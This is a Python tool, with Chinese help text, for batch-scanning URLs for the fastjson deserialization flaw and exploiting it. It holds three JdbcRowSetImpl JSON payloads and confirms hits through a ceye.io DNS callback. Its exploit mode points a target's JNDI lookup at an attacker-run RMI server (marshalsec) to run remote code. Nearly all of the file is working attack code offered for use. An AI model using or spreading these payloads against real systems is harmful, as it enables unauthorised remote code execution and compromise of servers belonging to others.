#!/usr/bin/env python
# -*- coding:utf-8 -*-
import requests as req
import random
import string
import argparse
import time
import socket

socket.setdefaulttimeout(5)
req.adapters.DEFAULT_RETRIES = 0
req.packages.urllib3.disable_warnings()

EXP_LIST = [
    '{"rand3": {"@type": "Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName": "%s","autoCommit": true}}',
    '{"rand1": {"@type": "java.lang.Class","val": "com.sun.rowset.JdbcRowSetImpl"},"rand2": {"@type": "com.sun.rowset.JdbcRowSetImpl","dataSourceName": "%s","autoCommit": true}}',
    '{"rand2": {"@type": "com.sun.rowset.JdbcRowSetImpl","dataSourceName": "%s","autoCommit": true}}'
]

def Apgparse():
    parser = argparse.ArgumentParser(description='fastjson批量漏洞检测利用')
    parser.add_argument('-u', '--url', type=str, help='单个需要检测的漏洞url')
    parser.add_argument('-l', '--list', type=str, help="批量检测的url列表 eg：url.txt")
    parser.add_argument('-i', '--index', type=str, default=-1, help="Payload 索引号")
    parser.add_argument('-s', '--save', type=str, help='存在漏洞url保存的文件名 eg: Vul_url.txt')
    parser.add_argument('-t', '--expoloit_target', type=str, help='漏洞利用目标')
    parser.add_argument('-r', '--rmiserver', type=str, help='使用marshalsec-0.0.3-SNAPSHOT-all.jar\
                                                            开启的rmi服务地址。eg：rmi://127.0.0.1/exp')

    parse = parser.parse_args()
    if not parse.url and not parse.list and not parse.expoloit_target:
        print('[!] 请检查输入参数！')
        exit(1)

    if parse.expoloit_target:
        if int(parse.index) < 0 or parse.index >= len(EXP_LIST):
            print('[!] 请指定 Exp 的索引号。')
            exit(1)

    return parse

def Random_str(num):
    random_str = ''.join(random.sample(string.ascii_letters + string.digits, num))
    return random_str

def Save(save_name, sava_list):
    try:
        with open(save_name, 'w') as f:
            for _ in save_list:
                f.write("{:3} {}\n".format(_[0], _[1]))
    except Exception as e:
        print(e)


def verify(vul_url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Content-Type': 'application/json'
    }

    random_str = Random_str(6)
    rmi_url = 'rmi://%s.your-ceye_domain/index' % random_str

    for i in range(len(EXP_LIST)):
        payload = EXP_LIST[i] % rmi_url
        # print(random_str)
        try:
            req.post(url=vul_url, data=payload, headers=headers, timeout=20, verify=False)
            time.sleep(3)
        except Exception as e:
            print(e)

        if Check_vul(random_str, vul_url) == False:
            continue

        print('[+] ' + vul_url + ' may be a vulnerability!')
        print('[+] EXP Index: {}'.format(i))
        save_list.append((i, vul_url))
        return True

    print('[-] ' + vul_url + ' not vulnerability!')

def Check_vul(random_str, vul_url):
    # print(vul_url)
    # print(random_str)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0'
    }
    try:
        ceye = req.get(url='http://api.ceye.io/v1/records?token=your-ceye_token&type=dns&filter=', headers=headers, timeout=5)

        if ceye.text.find(random_str) >= 0:
            return True
        else:
            return False
    except:
        print('[!] dnslogAPI调用失败，重新执行！')
        time.sleep(2)
        return Check_vul(random_str, vul_url)
    

def Exploit(target, rmi_server, index):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Content-Type': 'application/json'
    }
    exp_list = [
        '{"rand3": {"@type": "Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName": "%s","autoCommit": true}}',
        '{"rand1": {"@type": "java.lang.Class","val": "com.sun.rowset.JdbcRowSetImpl"},"rand2": {"@type": "com.sun.rowset.JdbcRowSetImpl","dataSourceName": "%s","autoCommit": true}}',
        '{"rand2": {"@type": "com.sun.rowset.JdbcRowSetImpl","dataSourceName": "%s","autoCommit": true}}'
    ]

    payload = exp_list[index] % rmi_server
    try:
        req.post(url=target, data=payload, headers=headers, timeout=20, verify=False)
        print('[+] 发送成功，检查exp是否执行')
    except:
        print('[-] 发送失败，请重试')


if __name__ == '__main__':
    parse = Apgparse()
    vul_url = parse.url
    save_name = parse.save
    target = parse.expoloit_target
    rmiserver = parse.rmiserver
    save_list = []
    
    if parse.list:
        with open(parse.list, 'r') as f:
            for _ in f:
                # print(_)
                verify(_.strip())
        Save(save_name,save_list)

    elif parse.expoloit_target:
        Exploit(target, rmiserver, parse.index)
        
    elif parse.url:
        verify(vul_url)










